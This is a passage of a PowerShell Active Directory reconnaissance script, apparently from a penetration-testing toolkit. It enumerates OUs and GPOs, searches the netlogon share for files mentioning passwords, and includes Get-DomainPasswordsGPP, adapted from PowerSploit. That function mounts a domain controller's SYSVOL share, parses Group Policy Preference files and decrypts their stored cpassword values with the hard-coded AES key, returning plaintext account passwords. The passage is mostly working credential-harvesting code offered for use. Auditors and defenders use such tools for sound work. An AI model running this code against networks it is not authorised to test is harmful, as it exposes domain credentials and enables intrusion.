        $OUs | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-OUs.csv"
        Write-Output " - Found $OUs_C Organizational Units"

        # Get GPOs
        $GPOAll = Get-GPO -All
        $GPOAll_C = $GPOAll | measure | select count -ExpandProperty count
        $GPOAll | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-GPOs.csv"
        Write-Output " - Found $GPOALL_C GPOs"

        # Get GPOs linked to OUs
        Write-Output "Getting GPOs Linked to OUs..."
        $LinkedGPO2OUList = $OUs | Where-Object LinkedGroupPolicyObjects -NotLike "" | 
        ForEach-Object {

            # Grab OU information
            $GPOLinks = $_.LinkedGroupPolicyObjects
            $OU_name = $_.name
            $OU_Description = $_.Description
            $OU_DisplayName = $_.DisplayName
            $OU_DistinguishedName = $_.DistinguishedName
            $OU_GUID = $_.GUID
            $OU_Created = $_.Created
            $OU_Modified = $_.Modified
            $OU_whenChanged = $_.WhenChanged
            $OU_whenCreated = $_.WhenCreated
            $OU_ProtectedFromAccidentalDeletion = $_.ProtectedFromAccidentalDeletion
            $OU_sDRightsEffective = $_.sDRightsEffective
            $OU_isDeleted = $_.isDeleted

            $GPOLinks | 
            ForEach-Object{
               $GUID = $_.split("{")[1].split("}")[0]               
               try{
                
                    # Grab linked GPO information
                    $GPO = Get-GPO -Guid "{$GUID}"
                    $LinkedGPO_DisplayName = $GPO.DisplayName
                    $LinkedGPO_Description = $GPO.Description
                    $LinkedGPO_Domain = $GPO.DomainName
                    $LinkedGPO_Owner = $GPO.Owner
                    $LinkedGPO_GUID = $GUID
                    $LinkedGPO_GPOStatus = $GPO.GPOStatus
                    $LinkedGPO_CreationTime = $GPO.CreationTime
                    $LinkedGPO_ModificationTime = $GPO.ModificationTime

                    # Create PS OBJECT 
                    $LinkedGPO2OU = New-Object PSObject                                       
                    $LinkedGPO2OU | add-member Noteproperty OU_name $OU_name
                    $LinkedGPO2OU | add-member Noteproperty OU_Description $OU_Description
                    $LinkedGPO2OU | add-member Noteproperty OU_DisplayName $OU_DisplayName
                    $LinkedGPO2OU | add-member Noteproperty OU_DistinguishedName $OU_DistinguishedName 
                    $LinkedGPO2OU | add-member Noteproperty OU_GUID $OU_GUID
                    $LinkedGPO2OU | add-member Noteproperty OU_Created $OU_Created
                    $LinkedGPO2OU | add-member Noteproperty OU_Modified $OU_Modified
                    $LinkedGPO2OU | add-member Noteproperty OU_whenChanged $OU_whenChanged
                    $LinkedGPO2OU | add-member Noteproperty OU_whenCreated $OU_whenCreated
                    $LinkedGPO2OU | add-member Noteproperty OU_ProtectedFromAccidentalDeletion $OU_ProtectedFromAccidentalDeletion
                    $LinkedGPO2OU | add-member Noteproperty OU_sDRightsEffective $OU_sDRightsEffective
                    $LinkedGPO2OU | add-member Noteproperty OU_isDeleted $OU_isDeleted
                    $LinkedGPO2OU | add-member Noteproperty LinkedGPO_DisplayName $LinkedGPO_DisplayName
                    $LinkedGPO2OU | add-member Noteproperty LinkedGPO_Description $LinkedGPO_Description
                    $LinkedGPO2OU | add-member Noteproperty LinkedGPO_Domain $LinkedGPO_Domain
                    $LinkedGPO2OU | add-member Noteproperty LinkedGPO_Owner $LinkedGPO_Owner
                    $LinkedGPO2OU | add-member Noteproperty LinkedGPO_GUID $LinkedGPO_GUID
                    $LinkedGPO2OU | add-member Noteproperty LinkedGPO_GPOStatus $LinkedGPO_GPOStatus
                    $LinkedGPO2OU | add-member Noteproperty LinkedGPO_CreationTime $LinkedGPO_CreationTime
                    $LinkedGPO2OU | add-member Noteproperty LinkedGPO_ModificationTime $LinkedGPO_ModificationTime             
             
                    # Return ps object
                    $LinkedGPO2OU
               }catch{
               }
            }
        }
        $LinkedGPO2OUList_C = $LinkedGPO2OUList | measure | select count -ExpandProperty count
        $LinkedGPO2OUList | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-GPOsLinked2OUs.csv"
        Write-Output " - Found $LinkedGPO2OUList_C links found"        

        # Get passwords stored in group policy preference files
        Write-Output "Checking for passwords in Group Policy Preference Files..."
        $GPP = Get-DomainPasswordsGPP -CurrentPath $CurrentPath -ErrorAction SilentlyContinue
        $GPP | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-GPPFiles.csv"
        $GPP_C = $GPP | Where-Object File -NotLike "" | measure | select count -ExpandProperty count
        Write-Output " - Found $GPP_C Group Policy Preference Files"
        $GPP_PW = $GPP | Where-Object CPassword -NotLike ""
        $GPP_PW_C = $GPP_PW | measure | select count -ExpandProperty count
        Write-Output " - Found $GPP_PW_C passwords found in Group Policy Preference Files"

        # List netlogon files
        # $CurrentPath =  pwd | select path -ExpandProperty path     
        Write-Output "Checking for NetLogon files..."         
        $TargetDC1 = "\\" + (Get-ADDomainController | select HostName -First 1 -ExpandProperty Hostname)
        $set1 = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        $result1 += $set1 | Get-Random -Count 10
        $DriveName1 = [String]::Join("",$result1)        
        $DrivePath1 = "$TargetDC1\netlogon"        
        if($Credential.UserName){

            try { New-PSDrive -PSProvider FileSystem -Name $DriveName1 -Root $DrivePath1 -Credential $Credential -ErrorAction Stop | Out-Null }
            catch { Write-Output " - Failed to mount netlogon path."; break}

        }else{

            try { New-PSDrive -PSProvider FileSystem -Name $DriveName1 -Root $DrivePath1 -ErrorAction Stop | Out-Null}
            catch { Write-Output " - Failed to mount netlogon path."; break}     
        }
        $Files = Get-ChildItem -Recurse $DrivePath1 -File | Select FullName 
        $Files_C = ($Files | measure) | measure | select count -ExpandProperty count
        $Files | Export-Csv -NoTypeInformation "$CurrentPath\$AdDomain\$AdDomain-NetlogonFiles.csv"
        cd $CurrentPath 
        Write-Output " - Found $Files_C files in netlogon folders/files"

        # Check files for passwords in files         
        $KeyWordTargets = @("password","net ")        
        $PotentialPasswords = $Files | 
        ForEach-Object {
            
            $TargetFile = $_.fullname            
            $TestMatch = Select-String -List $KeyWordTargets $TargetFile
            if($TestMatch -notlike ""){
                $TargetFile
            }      
        }        
        $PotentialPasswords_C = $PotentialPasswords | measure | select count -ExpandProperty count
        Write-Output " - Found $PotentialPasswords_C netlogon files that may contain passwords"
        $PotentialPasswords | Out-File "$CurrentPath\$AdDomain\$AdDomain-NetlogonFiles-PW.csv" 
        Remove-PSDrive $DriveName1

        # Get group policy settings - This should be optional
        # Get-GPOReport -All -ReportType Xml        

        # Get policies with local admins defined and associated ou
        # groups.xml and GptTmpl.inf

        # Get computer in a particular OU

        # Foreign Users

        # Foreign Groups
    }
    End
    {
        <#
        # Remove AD PS Drive
        if($username -and $password){
            cd $CurrentPath
            Write-Output "Disconnecting from $DomainController"
            Remove-PSDrive $DriveName
        }
        #>
    }
}

<#

SCRIPT
Get-DomainPasswordsGPP.ps1

AUTHOR
Chris Campbell (@obscuresec)

ADPS MOD AUTHOR
Scott Sutherland (@_nullbind), NetSPI 2015

DESCRIPTION
This script will recover plaintext passwords and other information for accounts pushed 
through Group Policy Preferences. The summary of changes made to Chris's original script include:
- Added support for the use of alternative credentials so users can connect to domain controllers 
  that their computer is not associated with.
- Replaced recursive directory search with list of default file locations to speed up file search.

USAGE EXAMPLES
Get-DomainPasswordsGPP 
Get-DomainPasswordsGPP -Verbose
Get-DomainPasswordsGPP -Verbose -DomainController IP -useranme domain\user -password 'passwordhere'

REFERENCES
Most of the code here is based on the Get-GPPPassword function written by Chris Campbell (@obscuresec).
https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

#>

function Get-DomainPasswordsGPP
{
    [CmdletBinding(DefaultParametersetName="Default")]
    Param(

        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Original execute path.")]
        [string]$CurrentPath
    )

    Begin
    {

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Ensure that machine is domain joined and script is running as a domain account, or a credential has been provided
        # if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) -and (-not $Credential) ) {
        #    throw 'Machine is not a domain member or User is not a member of the domain.'
        #    return
        #}

        # ----------------------------------------------------------------
        # Define helper function that decodes and decrypts password
        # ----------------------------------------------------------------
        function Get-DecryptedCpassword {
            [CmdletBinding()]
            Param (
                [string] $Cpassword 
            )

            try {
                #Append appropriate padding based on string length  
                $Mod = ($Cpassword.length % 4)
            
                switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
                }

                $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
                #Create a new AES .NET Crypto Object
                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
                #Set IV to all nulls to prevent dynamic generation of IV value
                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor() 
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
                return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            } 
        
            catch {Write-Error $Error[0]}
        }  
       
        # ----------------------------------------------------------------
        # Authenticate to DC and mount sysvol share
        # ----------------------------------------------------------------
 
        # Set target DC
        if($DomainController){
            $TargetDC = "\\$DomainController"
        }else{
            $TargetDC = "\\" + (Get-ADDomainController | select HostName -First 1 -ExpandProperty Hostname)
        }


        # Create randomish name for dynamic mount point 
        $set = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        $result += $set | Get-Random -Count 10
        $DriveName2 = [String]::Join("",$result)        
        $DrivePath2 = "$TargetDC\sysvol"

        # Map a temp drive to the DC sysvol share        
        If ($Credential.UserName){
        
            # Mount the drive
            New-PSDrive -PSProvider FileSystem -Name $DriveName2 -Root $DrivePath2 -Credential $Credential | Out-Null                        
        }else{
            
            # Create a temp drive mapping
            New-PSDrive -PSProvider FileSystem -Name $DriveName2 -Root $DrivePath2 | Out-Null                   
        }        
    }

    Process
    {
        # Verify temp drive mounted
        $DriveCheck = Get-PSDrive | Where { $_.name -like "$DriveName2"}
        if($DriveCheck) {
            #Write-Output " - $Drivename created."
        }else{
            Write-Verbose " - Failed to mount $DriveName2 to $DrivePath2."
            return
        }

        # ----------------------------------------------------------------
        # Find, download, parse, decrypt, and display results
        # ----------------------------------------------------------------
        
        # Setup temp drive name
        $DriveLetter2 = $DriveName2+":"

        # Create table to store gpp passwords 
        $TableGPPPasswords = New-Object System.Data.DataTable         
        $TableGPPPasswords.Columns.Add('NewName') | Out-Null
        $TableGPPPasswords.Columns.Add('Changed') | Out-Null
        $TableGPPPasswords.Columns.Add('UserName') | Out-Null        
        $TableGPPPasswords.Columns.Add('CPassword') | Out-Null
        $TableGPPPasswords.Columns.Add('Password') | Out-Null        
        $TableGPPPasswords.Columns.Add('File') | Out-Null 

        # Create table to store default group policy configuration file paths
        $TableDefaultGPFilePaths = New-Object system.data.datatable
        $TableDefaultGPFilePaths.Columns.Add('filename') | Out-Null
        $TableDefaultGPFilePaths.Columns.Add('filepath') | Out-Null  

        # Add default group policy configuration file paths to table
        $TableDefaultGPFilePaths.Rows.Add("Groups.xml","\Machine\Preferences\Groups\Groups.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Groups.xml","\User\Preferences\Groups\Groups.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Services.xml","\Machine\Preferences\Services\Services.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Services.xml","\User\Preferences\Services\Services.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Scheduledtasks.xml","\Machine\Preferences\Scheduledtasks\Scheduledtasks.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Scheduledtasks.xml","\User\Preferences\Scheduledtasks\Scheduledtasks.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("DataSources.xml","\Machine\Preferences\DataSources\DataSources.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("DataSources.xml","\User\Preferences\DataSources\DataSources.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Printers.xml","\Machine\Preferences\Printers\Printers.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Printers.xml","\User\Preferences\Printers\Printers.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Drives.xml","\Machine\Preferences\Drives\Drives.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Drives.xml","\User\Preferences\Drives\Drives.xml") | Out-Null 
        
        # Create table to store verified files
        $TableGPFilePaths = New-Object system.data.datatable
        $TableGPFilePaths.Columns.Add('filename') | Out-Null
        $TableGPFilePaths.Columns.Add('filepath') | Out-Null
        $TableGPFilePaths.Clear()       

        # Determine policies folder path
        $ADSDir = pwd | select path -ExpandProperty path
        cd $CurrentPath
        $GpoDomain = Get-ChildItem "$DrivePath2" | Select-Object name -First 1 -ExpandProperty name
        $GpoPoliciesPath = "$DrivePath2\$GpoDomain\Policies"

        # Iterate through each policy folder
        Get-ChildItem $GpoPoliciesPath | Select-Object fullname -ExpandProperty fullname |
        ForEach-Object {

            $GpPolicyPath = $_                   
            
            # Iterate through each potential gpp file path
            $TableDefaultGPFilePaths |
            ForEach-Object{

                # Create full path to gp configuraiton file
		        $GpFile = $_.filename
		        $GpPath = $_.filepath
		        $GpFullPath = "$GpPolicyPath$GpPath"
                
                # Check if file exists
                if(Test-Path $GpFullPath -ErrorAction SilentlyContinue)
                {
                    # Add files that exist to table
                    $TableGPFilePaths.Rows.Add($GpFile,$GpFullPath) | Out-Null                    
                }
            }            
        }

        # Check if files were found
        $TableGPFilePathCount = $TableGPFilePaths.Rows | measure | select count -ExpandProperty count
        if ($TableGPFilePathCount -eq 0) {
           #Write-Verbose " - Found 0 group policy preference files"           
        }else{
           #Write-Verbose " - Found $TableGPFilePathCount group policy preference files"
        }       

        # Iterate through each verified group policy file        
        $TableGPFilePaths | 
        ForEach-Object {
            [string]$FileName = $_.filename
            [string]$FilePath = $_.filepath

            # Get file content
            $FileContentpre = Get-Content -Path "$FilePath"
            [xml]$FileContent = $FileContentpre.Trim()

            # Parse Drives.xml
            if($FileName -like "Drives.xml"){   

                #Write-Verbose " - Parsing $FileName..."
                 
                $FileContent.Drives.Drive | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }  
            
            # Parse Groups.xml
            if($FileName -eq "Groups.xml"){   

                #Write-Verbose " - Parsing $FileName..."
                 
                $FileContent.Groups.User | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = $_.properties.newname        
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            } 
            
            # Parse Services.xml
            if($FileName -eq "Services.xml"){   

                #Write-Verbose " - Parsing $FileName..."
                 
                $FileContent.NTServices.NTService | 
                ForEach-Object {
                    [string]$Username = $_.properties.accountname
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         

                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
            # Parse ScheduledTasks.xml
            if($FileName -eq "ScheduledTasks.xml"){   

                 #Write-Verbose " - Parsing $FileName..."
                 
                $FileContent.ScheduledTasks.Task | 
                ForEach-Object {
                    [string]$Username = $_.properties.runas
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            } 
            
            # Parse DataSources.xml
            if($FileName -eq "DataSources.xml"){   

                 #Write-Verbose " - Parsing $FileName..."
                 
                $FileContent.DataSources.DataSource | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
            # Parse Printers.xml
            if($FileName -eq "Printers.xml"){   

                 #Write-Verbose " - Parsing $FileName..."
                 
                $FileContent.Printers.SharedPrinter | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = [datetime]::FromFileTimeUTC([string]$_.changed)
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
        }     
        
        # Remove the temp drive mapping
        #Write-Verbose " - Removing temp drive $DriveName2..."
        Remove-PSDrive $DriveName2
        
        # Display results
        $PasswordCount = $TableGPPPasswords | Sort-Object username -Unique | Select-Object username | Where-Object {$_.username -ne ""} | Measure-Object | Select-Object Count -ExpandProperty Count
        if($PasswordCount -ne 0)
        {
            #Write-Output " - $PasswordCount domain group policy preference passwords were found."
            Return $TableGPPPasswords
        }else{
            #Write-Output " - 0 domain group policy preference passwords were found."
        }
    }

    END
    {
    }
}
